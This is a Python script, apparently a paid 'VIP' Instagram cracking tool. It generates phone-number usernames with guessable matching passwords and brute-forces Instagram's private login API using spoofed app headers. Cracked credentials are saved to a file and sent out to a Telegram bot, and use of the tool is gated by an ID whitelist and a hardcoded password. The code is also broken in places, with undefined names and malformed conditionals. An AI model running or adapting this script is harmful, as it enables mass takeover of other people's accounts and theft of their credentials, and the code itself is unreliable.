import os
from time import sleep
import pyfiglet
import sys
import os
import time
import webbrowser

try:
    import requests
except ImportError:
    os.system('pip install clear')
    import requests
    clear()
import os
import sys
import requests
import requests,sys,os,time

def profisor():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[1;91mID : "+id)
  try:
    httpCaht = requests.get("https://github.com/ImProfisor/ImProfisor/blob/main/list.txt").text
    if id in httpCaht:
      print("\033[1;32mYOUR ID IS ACTIVE!.....")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      print("\x1b[1;91mIDT ACTIVE NIA LA TELEGRAM NAMA BNERA....")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	profisor()
profisor()
Sayeb = 'ImProfis0r'
pss=input("\033[1;32m [~]\033[32mENTER PASSWORD :\033[1;32m")
if pss ==Sayeb:
 pass
 print("\033[1;32m    PASSWORD✅ ")
 os.system('clear')
else:
 exit('\033[1;91m            Forget PASSWORD')


      
 
    
    	
os.system('color a')
def banner():
	print("""\033[1;32m
  ██╗███╗   ██╗███████╗████████╗ █████╗
  ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗                     ██║██╔██╗ ██║███████╗   ██║   ███████║                     ██║██║╚██╗██║╚════██║   ██║   ██╔══██║
  ██║██║ ╚████║███████║   ██║   ██║  ██║
  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝•VIP	

            """)
print(logo)
print("")
print("\033[1;32m[!] Welcome")
h , b,s,block = 0,0,0,0
tele = input(G + '[+] Send Hited To Telegram Y/N ?: ')
if "Y" in tele:
    id = input(E+' ['+A+'+'+E+']'+A+' ~ Enter your ID :'+G)
    bot = input(E+' ['+A+'+'+E+']'+A+' ~ Enter TOKEN BOT :'+G)
elif "y" in tele:
    id = input(E+' ['+A+'+'+E+']'+A+' ~ Enter your ID :'+G)
    bot = input(E+' ['+A+'+'+E+']'+A+' ~ Enter TOKEN BOT :'+G)
    code = input(' Enter Code Country : ')
    slm = input(' Enter Code Number : ')
print("==========================")
   
make = '1234567890'
clear()
banner()
print("")
print(f"\r       [=] Hit : {h} / Bad : {b} / Scurity : {s} / Block : {block}",end='')

while True:
        us = str(''.join((random.choice(make) for i in range(7))))
        user = code + us
        pasw = slm + us
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=ʜɪ ɴᴇᴡ ᴀᴄᴄ ɪɴsᴛᴀ \n.ᴛᴏᴏʟ ᴠɪᴘ.\n====================\n[=] ᴘʜᴏɴᴇ : {user} \n[=] ᴘᴀssᴡᴏʀᴅ : {pasw}\n====================\nᴅᴇᴠ : @ImProfis0r\nᴄʜ : @ProfisorxGaming")
            open("Hited.txt","a").write(f"{user}:{pasw}\n")
            h += 1
            print(f"\r       [=] Hit : {h} / Bad : {b} / Scurity : {s} / Block : {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r       [=] Hit : {h} / Bad : {b} / Scurity : {s} / Block : {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r       [=] Hit : {h} / Bad : {b} / Scurity : {s} / Block : {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r       [=] Hit : {h} / Bad : {b} / Scurity : {s} / Block : {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r       [=] Hit : {h} / Bad : {b} / Scurity : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r       [=] Hit : {h} / Bad : {b} / Scurity : {s} / Block : {block}",end='')
